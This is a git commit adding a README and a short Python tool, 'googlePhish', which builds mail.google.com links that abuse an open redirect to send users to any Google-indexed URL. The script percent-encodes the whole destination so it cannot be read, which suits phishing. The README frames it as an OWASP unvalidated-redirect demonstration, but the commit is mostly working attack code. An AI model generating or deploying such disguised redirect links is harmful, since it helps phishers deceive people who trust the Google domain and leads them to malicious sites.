f60aacf6b3d180f102ae4a0f5ba9aaa1982125cc
vlp443 <jeremy.lawrence@owasp.org>
2019-08-15 19:06:28 +0100

    first commit

--- README.md
+++ README.md
@@ -1,1 +1,15 @@
 # googlePhish
+
+Simple tool to generate redirects from mail.google.com to any url that is searchable by google
+
+### Abstract
+The OWASP top ten 2013 included A10-Unvalidated Redirects and Forwards with the following description:
+Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages. 
+This item does not appear in the top ten 2017
+
+google.com has over 40 unsecured redirects, so I have created this tool to generate encoded links from mail.google.com to a passed in location.  Of course it is intended purely for demonstration purposes and I take no responsibility for any misuse.
+
+### Usage
+
+python3 ./googlePhish --url https://www.pets4homes.co.uk/sale/cats
+
---
+++ googlePhish.py
@@ -0,0 +1,35 @@
+import argparse
+import sys
+
+print ("""
+ _______  _______  _______  _______  _        _______  _______          _________ _______          
+(  ____ \(  ___  )(  ___  )(  ____ \( \      (  ____ \(  ____ )|\     /|\__   __/(  ____ \|\     /|
+| (    \/| (   ) || (   ) || (    \/| (      | (    \/| (    )|| )   ( |   ) (   | (    \/| )   ( |
+| |      | |   | || |   | || |      | |      | (__    | (____)|| (___) |   | |   | (_____ | (___) |
+| | ____ | |   | || |   | || | ____ | |      |  __)   |  _____)|  ___  |   | |   (_____  )|  ___  |
+| | \_  )| |   | || |   | || | \_  )| |      | (      | (      | (   ) |   | |         ) || (   ) |
+| (___) || (___) || (___) || (___) || (____/\| (____/\| )      | )   ( |___) (___/\____) || )   ( |
+(_______)(_______)(_______)(_______)(_______/(_______/|/       |/     \|\_______/\_______)|/     \|
+                                                                                                   """)
+
+
+def urlEncodeUrl(url):
+    encoded = url.encode('utf-8').hex()
+    return '%' + '%'.join(a+b for a,b in zip(encoded[::2], encoded[1::2]))
+
+def printUrl(src):
+    print("https://mail.google.com/webhp#?uid=Z29vZ2xlUGhpc2g6ICBnaXRodWIuY29tL3ZscDQ0Mw==&q=" + urlEncodeUrl(src) + "=&btnI=I")
+
+
+
+parser = argparse.ArgumentParser(description='Generate links to google searchable urls using unsecured redirects in mail.google.com.'
+                                             'Usage python3 ./googlePhish.py --url https://www.pets4homes.co.uk/sale/cats')
+parser.add_argument('--url', metavar='Location to link to e.g. https://www.pets4homes.co.uk/sale/cats', type=printUrl, nargs=1, help="Generate link to url")
+
+try:
+    if (len(sys.argv) < 2):
+        raise Exception
+    args = parser.parse_args()
+except :
+    parser.print_help()
+    exit(1)
